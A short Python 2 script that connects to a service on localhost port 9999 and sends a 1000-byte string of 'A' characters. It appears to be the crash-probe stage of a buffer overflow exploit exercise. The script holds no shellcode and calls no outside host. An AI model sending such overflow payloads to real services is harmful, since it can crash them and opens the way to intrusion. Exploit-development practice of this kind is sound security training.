#!/usr/bin/python

import socket
target_ip = '127.0.0.1'
port = 9999

buffer = "\x41" * 1000

try:
    print "\n Progress please wait :)"
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((target_ip, port))
    s.recv(1024)
    s.send(buffer)
    print "\ndone"
except:
    print "Failed"
